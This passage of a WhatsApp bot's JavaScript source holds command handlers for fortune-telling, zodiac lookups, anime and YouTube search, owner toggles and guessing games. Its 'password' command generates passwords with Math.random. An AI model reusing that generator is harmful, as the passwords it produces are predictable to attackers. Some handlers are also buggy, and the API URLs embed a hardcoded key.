reply(teks)
}
break
case 'entrepreneurial nature': {
if (!q) return reply( `Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Born :* ${anu.message.hari_lahir}
• *Business :* ${anu.message.usaha}`
reply(teks)
}
break

case 'findanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return reply("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return reply("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Queen_Anita-V2"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: "©ᴅᴀᴠɪᴅ ᴄʏʀɪʟ",
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ptz.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    reply("*Error: Could not track the anime or send the video.*");
  }
};
break
            
    case 'rejeki': 
case 'rezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Rezeki :* ${anu.message.rejeki}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'pekerjaan':  {
if (!q) return reply( `Example : ${prefix + command}  7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Born :* ${anu.message.hari_lahir}
• *Work :* ${anu.message.pekerjaan}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
case 'ramalnasib': 
case 'nasib': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Analysis :* ${anu.message.analisa}
• *Root Number :* ${anu.message.angka_akar}
• *Nature :* ${anu.message.sifat}
• *Elements :* ${anu.message.elemen}
• *Lucky Numbers :* ${anu.message.angka_keberuntungan}`
reply(teks)
}
break 
case 'penyakit': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Analysis :* ${anu.message.analisa}
• *Sector :* ${anu.message.sektor}
• *Elements :* ${anu.message.elemesektorn}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
case 'artitarot': 
case 'tarot': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Born :* ${anu.message.tgl_lahir}
• *Tarot Symbols :* ${anu.message.simbol_tarot}
• *Arti :* ${anu.message.arti}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
case 'fengshui': {
if (!q) return reply( `Example : ${prefix + command} David, 5, 2005\n\nNote : ${prefix + command} No, gender, year of birth\nGender : 1 for male & 2 for female`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
let teks = `
• *No :* ${anu.message.nama} 
• *Born :* ${anu.message.tahun_lahir}
• *Gender :* ${anu.message.jenis_kelamin}
• *Number Kua :* ${anu.message.angka_kua}
• *Group :* ${anu.message.kelompok}
• *Character :* ${anu.message.karakter}
• *Good Sector :* ${anu.message.sektor_baik}
• *Bad Sector :* ${anu.message.sektor_buruk}`
reply(teks)
}
break
case 'haribaik': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Born :* ${anu.message.tgl_lahir}
•™*When Challenged :* ${anu.message.kala_tinantang}
• *Info :* ${anu.message.info}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisangar': 
case 'taliwangke': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Born :* ${anu.message.tgl_lahir}
• *Results :* ${anu.message.result}
• *Info :* ${anu.message.info}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisial': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Day of birth :* ${anu.message.hari_lahir}
• *Date of birth :* ${anu.message.tgl_lahir}
• *Fateful Day :* ${anu.message.hari_naas}
• *Info :* ${anu.message.catatan}
• *Notes :* ${anu.message.info}`
reply(teks)
}
break
case 'harinaga': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Day of birth :* ${anu.message.hari_lahir}
• *Date of birth :* ${anu.message.tgl_lahir}
• *Dragon Day Direction :* ${anu.message.arah_naga_hari}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break


            
            
case 'autorecording': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoRecord = true
await reply('SucessFully Activated Autorecording.')
} else if (args[0] === 'off') {
global.autoRecord = false
await reply('SucessFully Deactivated Autorecording.')
}}
break            


case 'chatbot': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.chatbot = true
await reply('SucessFully Activated Chatbot.')
} else if (args[0] === 'off') {
global.chatbot = false
await reply('SucessFully Deactivated ChatBot.')
}}
break             

case 'autotyping': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoTyping = true
await reply('SucessFully Activated AutoTyping.')
} else if (args[0] === 'off') {
global.autoTyping = false
await reply('SucessFully Deactivated AutoTyping.')
}}
break            

case 'autoreact': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoreact = true
await reply('SucessFully Activated AutoReact.')
} else if (args[0] === 'off') {
global.autoreact = false
await reply('SucessFully Deactivated AutoReact.')
}}
break             


case 'alwaysonline': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.available = true
await reply('SucessFully Activated Alwaysonline.')
} else if (args[0] === 'off') {
global.available = false
await reply('SucessFully Deactivated Alwaysonline.')
}}
break             
            
case 'unavailable': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.unavailable = true
await reply('SucessFully Activated Unavailable')
} else if (args[0] === 'off') {
global.unavailable = false
await reply('SucessFully Deactivated Unavailable.')
}}
break                      
         
case 'autoread': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoreadmessages = true
await reply('SucessFully Activated Always Online')
} else if (args[0] === 'off') {
global.autoreadmessages = false
await reply('SucessFully Deactivated Alwaysonline.')
}}
break                        




case 'arahrejeki': 
case 'arahrezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Day of birth :* ${anu.message.hari_lahir}
• *date of birth :* ${anu.message.tgl_lahir}
• *Direction of Sustenance :* ${anu.message.arah_rejeki}
• *Notes :* ${anu.message.catatan}`
reply(teks)
}
break

case 'flux':
  if (!text) return reply('Give me a Prompt !!')
  try {
    await loading()
    let pix = await (await fetch('https://endpoint.web.id/ai/flux-schnell?key=gojou&prompt=' + text)).json()
    let shannz = pix.result[0]
    ptz.sendMessage(m.chat, { image: { url: shannz }, caption: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™' }, { quoted: m })
} catch (e) {
    reply('*there is an error*')
}
break

case 'narutotts':
  if (!text) return reply('masukan text nya!')
  try {
    reply('generating...');
    let voice = await (await fetch(`https://api.shannmoderz.xyz/ai/voice?query=${text}&id=23177&key=gojou`)).json();
  let cover = voice.result;
  ptz.sendMessage(m.chat, { audio: { url: cover }, mimetype: 'audio/mpeg' }, { quoted: m })
} catch (e) {
   reply('sorry!');
}
break


 case 'sticker-search':
    if (!text) return reply('enter the theme!');
    try {
        let tick = await (await fetch('https://endpoint.web.id/search/sticker?key=gojou&query=' + text)).json();
        if (tick.status) {
            let result = tick.result;
            let responseMessage = `*Title:* ${result.title}\n*Author:* ${result.author}\n*Author Link:* ${result.author_link}\n\n*Stickers:*\n`; result.sticker.forEach((stickerUrl, index) => {
                responseMessage += `Sticker ${index + 1}: ${stickerUrl}\n`;
            }); reply(responseMessage);
        } else {
            reply('No results found..');
        }
    } catch (e) {
        reply('There is an error!');
    }
break;

case 'peruntungan': {
if (!q) return reply( `Example : ${prefix + command} habib, 28, 6, 2004, 2022\n\nNote : ${prefix + command} Name, date of birth, month of birth, year of birth, for the year`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
let teks = `
• *No :* ${anu.message.nama}
• *Born :* ${anu.message.tgl_lahir}
• *Fortune of the Year :* ${anu.message.peruntungan_tahun}
• *Results :* ${anu.message.result}
• *Notes :* ${anu.message.catatan}`
}
break
case 'weton': 
case 'wetonjawa': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Date :* ${anu.message.tanggal}
• *Number of Neptu :* ${anu.message.jumlah_neptu}
• *Character of the Day :* ${anu.message.watak_hari}
• *Dragon Day :* ${anu.message.naga_hari}
• *Good Hour :* ${anu.message.jam_baik}
• *Birth Character :* ${anu.message.watak_kelahiran}`
reply(teks)
}
break
case 'karakter': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *No :* ${anu.message.nama}
• *Born :* ${anu.message.tgl_lahir}
• *Life Line :* ${anu.message.garis_hidup}`
reply(teks)
}
break
case 'keberuntungan': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *No :* ${anu.message.nama}
• *Born :* ${anu.message.tgl_lahir}
• *Results :* ${anu.message.result}`
reply(teks)
}
break
case 'masasubur': {
if (!q) return reply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} first day of menstruation, cycle`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
let teks = `
•  *Results :* ${anu.message.result}
•  *Notes :* ${anu.message.catatan}`
reply(teks)
}
break
  case 'zodiak': 
case 'zodiac': {
if (!q) return reply( `Example : ${prefix + command} 7 7 2005`)
let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(q)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
let teks = `
∘ *Zodiak :* ${anu.message.zodiak}
∘ *Number :* ${anu.message.nomor_keberuntungan}
∘ *Aroma :* ${anu.message.aroma_keberuntungan}
∘ *Planet :* ${anu.message.planet_yang_mengitari}
∘ *Flower :* ${anu.message.bunga_keberuntungan}
∘ *Color :* ${anu.message.warna_keberuntungan} 
∘ *Batu :* ${anu.message.batu_keberuntungan}
∘ *Element :* ${anu.message.elemen_keberuntungan}
∘ *Zodiac couple :* ${anu.message.pasangan_zodiak}
∘ *Notes :* ${anu.message.catatan}`
reply(teks)
}
break

 // ===================================== // 




 case 'ytmp4': {
 if (!text) return m.reply('*Example :*\n> *.ytmp4 <youtube link>*')
try {
 reply('*The process of sending video may take 1-3 minutes if the video duration is long.*')
 let proces = await (await fetch(`https://endpoint.web.id/downloader/yt-video?key=gojou&url=${text}`)).json()
 let video4 = proces.result; 
 ptz.sendMessage(m.chat,{video:{url: video4.download_url }, caption: video4.title},{quoted: m})
} catch (e) {
 reply('*Error*');
}
}
break

        

case "youtubsearch": case "yts": {
try {
        let res = await yts(text);
        let url = res.all;
        let result = url[Math.floor(Math.random() * url.length)];

        async function image(url) {
            const { imageMessage } = await generateWAMessageContent({
                image: { url }
            }, {
                upload: ptz.waUploadToServer
            });
            return imageMessage;
        }

        const url1 = result.thumbnail;
        const url2 = res.all[1].thumbnail;
        const url3 = res.all[2].thumbnail;

const auth2 = res.all[1].author.name;
        const auth3 = res.all[2].author.name;
        
      const urlvid2 = res.all[1].url;
        const urlvid3 = res.all[2].url;

        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: `*${m2}( 3 BEST SEARCHES )${m2}*\n\n*[ 1 ]* \n-- ${result.title}\n\n*[ 2 ]* \n-- ${res.all[1].title}\n\n*[ 3 ]* \n-- ${res.all[2].title}` },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            imageMessage: await image(url1),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*${m2}[ R E S U L T - V I D ]${m2}*\n\n*Upload By:* ${result.author.name}\nUrl: ${result.url}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                             
                                                {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${result.url}"}`
                },
                 {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${result.url}"}`
                },     
                     {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url2),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*${m2}[ R E S U L T - V I D ]${m2}*\n\n*Upload By:* ${auth2}\nUrl: ${urlvid2}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                            
                                                 {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid2}"}`
                },    
                      {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid2}"}`
                },    
                      {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await image(url3),
                                            hasMediaAttachment: true,
                                        },
                                        body: { text: `*${m2}[ R E S U L T - V I D ]${m2}*\n\n*Upload By:* ${auth3}\nUrl: ${urlvid3}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                            
                                                 {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Play Song ✦","id": ".gcgcplaycuy ${urlvid3}"}`
                },         
                {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Download Video -","id": ".ytmp4 ${urlvid3}"}`
                },      
                      {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"View <⊚>","url":"${url1}","webview_presentation":null}`,
                                                },
                                            ],
                                        },
                                    },
                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await ptz.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });

    } catch (error) {
        console.error(error);
    }
}
break
         case 'languages':{
	let LANGUAGES = `
	*╭─❲ LANGUAGE CODE ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────•*`
	reply(LANGUAGES)
	}
	break
	
case 'password':
    const length = parseInt(args[0]) || 12;
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
    let password = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    reply(`*Generated Password:* ${password}`);
    break;
	
        case 'mood':
    const currentHour = new Date().getHours();
    let mood = '';

    if (currentHour < 6) {
        mood = 'Sleepy 😴';
    } else if (currentHour < 12) {
        mood = 'Energetic ☀️';
    } else if (currentHour < 18) {
        mood = 'Productive 💼';
    } else {
        mood = 'Relaxed 🌙';
    }

    reply(`Your mood is: ${mood}`);
    break;
 
     //========// game
  



     case 'delttc':
case 'delttt': {
this.game = this.game ? this.game : {};
try {
if (this.game) {
delete this.game;
ptz.sendText(m.chat, `Succeed delete session TicTacToe`, m);
} else if (!this.game) {
reply(`TicTacToe session does not exist`);
} 

} catch (e) {
reply('rusak');
}
}
break;
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Finish your previous suit`)
if (m.mentionedJid[0] === m.sender) return reply(`Can't play with yourself !`)
if (!m.mentionedJid[0]) return reply(`_Who do you want to tag?_\nTag the person..\nand Examples : ${prefix}suit @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you challenged is playing rock, paper, scissors with someone else. :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suit

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
this.suit[id] = {
chat: await ptz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) ptz.sendText(m.chat, `_Rock paper scissors time is up_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break;
case 'kuismath':
case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let {
genMath,
modes
} = require('./lib/math.js');
if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nExample _usage: ${prefix}math medium`);
let result = await genMath(text.toLowerCase());
ptz.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban;
});
await sleep(result.waktu);
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.jawaban);
reply("Time Out\nAnswer: " + kuismath[m.sender.split('@')[0]]);
delete kuismath[m.sender.split('@')[0]];
}
}
break;
case 'tebak': {
if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Please Answer the Question Above\n\nDescription: ${result.deskripsi}\nTime : 60s`
}, {
quoted: m
}).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.jawaban);
ptz.sendText(m.chat, `Time Done\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
delete tebakgambar[m.sender.split('@')[0]];
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer Questions Following\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban);
ptz.sendText(m.chat, `Time Question\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}`, m);
delete tebakkata[m.sender.split('@')[0]];
}
 } else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer Questions Following\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban);
ptz.sendText(m.chat, `Time Out of stock\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}`, m);
delete tebakkalimat[m.sender.split('@')[0]];
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `These Are The Lyrics Of The Song? : *${result.soal}*?\nTime : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}`, m);
delete tebaklirik[m.sender.split('@')[0]];
}
} else if (args[0] === 'tebakan') {
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Answer the following questions: *${result.soal}*?\nTime : 60s`, m).then(() => {
tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer::  ${tebaktebakan[m.sender.split('@')[0]]}`, m);
delete tebaktebakan[m.sender.split('@')[0]];
}
} else if (args[0] === 'flag') {
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Please Answer the Following Picture\n\nClue : ${result.flag}\nTime : 60s`
}, {
quoted: m
}).then(() => {
tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase();
});
await sleep(60000);
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.name);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebakbendera[m.sender.split('@')[0]]}`, m);
delete tebakbendera[m.sender.split('@')[0]];
}
} else if (args[0] === 'bendera2') {
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
quoted: m
}).then(() => {
tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase();
});
await sleep(60000);
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.name);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebakbendera2[m.sender.split('@')[0]]}`, m);
delete tebakbendera2[m.sender.split('@')[0]];
}
} else if (args[0] === 'kabupaten') {
